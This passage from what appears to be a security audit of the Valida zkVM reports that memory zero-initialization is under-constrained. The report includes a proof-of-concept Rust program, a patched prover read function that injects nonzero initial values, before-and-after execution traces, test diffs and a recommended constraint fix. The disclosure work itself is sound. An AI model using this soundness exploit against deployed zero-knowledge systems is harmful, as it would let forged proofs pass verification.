  2 changes: 1 addition & 1 deletion2  
cpu/src/lib.rs
Original file line number	Diff line number	Diff line change
@@ -1092,7 +1092,7 @@ where
            imm = Some(c);
            c
        } else {
            let read_addr_2 = (state.machine.cpu().fp as i32 + ops.c()) as u32;
            let read_addr_2 = state.machine.cpu().fp as u32; //(state.machine.cpu().fp as i32 + ops.c()) as u32;
            M::read(state, clk, read_addr_2)
        };
        if state.machine.log_enabled() {
```

## Finding 6: Zero-Initialization of Memory is Under-Constrained

Currently, values in the memory are expected to be initialized to zero, while there is no such constraint in MemoryChip:

A working PoC is available here: https://github.com/Koukyosyumei/valida-vm/tree/poc-memory-attack-1
Run with

```bash
cd basic-api/tests/
cargo test prove_target --release
```

This PoC considers the following program:

```rust
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([0, 1, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 2, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, -8, 1, 0, 1]),
        },
        InstructionWord {
            opcode: <BneInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([1 * bytes_per_instr, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);
```

This program is expected to produce the following traces:

```
Main trace for Chip: CPU
--------------------------------------------------------------------------------
CPU row 0: CpuCols { clk: 0, pc: 0, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([0, 1, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4096, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 1: CpuCols { clk: 1, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([2013265917, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, operands: Operands([2013265913, 2013265913, 1, 0, 1]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 1, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 3: CpuCols { clk: 3, pc: 3, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 4: CpuCols { clk: 4, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([2013265917, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 5: CpuCols { clk: 5, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, operands: Operands([2013265913, 2013265913, 1, 0, 1]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 1, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 6: CpuCols { clk: 6, pc: 3, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 7: CpuCols { clk: 7, pc: 4, fp: 4096, instruction: InstructionCols { opcode: 8, operands: Operands([0, 0, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 1, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }

Main trace for Chip: Memory
--------------------------------------------------------------------------------
Memory row 0: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 2, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 1: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 2, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 2: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 3, diff_bytes: Word([2, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 2, diff_inv: 1006632961, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 3: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 5, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 4: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 5, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 5: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 6, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 6: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 1, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 7: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 1, diff_bytes: Word([2, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 2, diff_inv: 1006632961, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 8: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 3, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 9: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 4, diff_bytes: Word([2, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 2, diff_inv: 1006632961, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 10: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 6, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 11: MemoryCols { addr: 4096, addr_bytes: Word([0, 16, 0, 0]), value: Word([0, 0, 0, 0]), clk: 0, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 12: MemoryCols { addr: 4096, addr_bytes: Word([0, 16, 0, 0]), value: Word([1, 0, 0, 0]), clk: 0, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Main trace dimensions for Chip: Memory
```

By modifying the `read` function of the Memory:

```rust
        // Attempt to get the memory record from the current segment's memory backend
        let mut record: MemoryRecord = state
            .runtime
            .memory_backend()
            .get(&address)
            .copied()
            .unwrap_or_default();
        if let MemoryAccessTimestamp::ZeroInitialized = record.last_accessed {
            record.value = Word::<u8>::from_u8(1);
        }
```

The program reads the maliciously initialized value, altering the state transition:

```
Main trace for Chip: CPU
--------------------------------------------------------------------------------
CPU row 0: CpuCols { clk: 0, pc: 0, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([0, 1, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4096, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 1: CpuCols { clk: 1, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([2013265917, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, operands: Operands([2013265913, 2013265913, 1, 0, 1]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 1, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 3: CpuCols { clk: 3, pc: 3, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 4: CpuCols { clk: 4, pc: 4, fp: 4096, instruction: InstructionCols { opcode: 8, operands: Operands([0, 0, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 1, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
Main trace dimensions for Chip: CPU

--------------------------------------------------------------------------------
Main trace for Chip: Memory
--------------------------------------------------------------------------------
Memory row 0: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 2, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 1: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 2, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 2: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 3, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 3: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 1, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 4: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 1, diff_bytes: Word([2, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 2, diff_inv: 1006632961, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 5: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 3, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 6: MemoryCols { addr: 4096, addr_bytes: Word([0, 16, 0, 0]), value: Word([0, 0, 0, 0]), clk: 0, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 7: MemoryCols { addr: 4096, addr_bytes: Word([0, 16, 0, 0]), value: Word([1, 0, 0, 0]), clk: 0, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Main trace dimensions for Chip: Memory
```

**Recommendation**

Add

```rust
builder.when(local.is_zero_initialized).assert_zero(local.value)
```

```rs
 
basic-api/tests/test_prover.rs
Original file line number	Diff line number	Diff line change
@@ -47,6 +47,36 @@ use valida_machine::__internal::p3_commit::ExtensionMmcs;
mod common;
use common::*;

fn get_target_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let bytes_per_instr = BYTES_PER_INSTR as i32;

    let mut program = vec![];
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([0, 1, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 2, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, -8, 1, 0, 1]),
        },
        InstructionWord {
            opcode: <BneInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([1 * bytes_per_instr, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);

    program
}

fn div_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let mut program = vec![];

@@ -1043,6 +1073,19 @@ fn expected_sdiv_memory_state(memory_backend: &ValidaMemoryBackend) {
    );
}

// get_target_program
#[test]
fn prove_target() {
    /*
    CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
     */

    let program = get_target_program::<BabyBear>();
    let (_machine, memory_backend) = prove_program(program, ProgramTableType::Public);
    //expected_sdiv_memory_state(&memory_backend);
    assert!(false, "Verification should fail");
}

#[test]
fn prove_sdiv() {
    let program = sdiv_program::<BabyBear>();
  5 changes: 4 additions & 1 deletion5  
memory/src/lib.rs
Original file line number	Diff line number	Diff line change
@@ -278,12 +278,15 @@ pub trait MachineWithMemoryChip<F: PrimeField>:
        let log = state.machine.log_enabled();

        // Attempt to get the memory record from the current segment's memory backend
        let record: MemoryRecord = state
        let mut record: MemoryRecord = state
            .runtime
            .memory_backend()
            .get(&address)
            .copied()
            .unwrap_or_default();
        if let MemoryAccessTimestamp::ZeroInitialized = record.last_accessed {
            record.value = Word::<u8>::from_u8(1);
        }

        // Insert the new operation
        let new_record = MemoryRecord {
```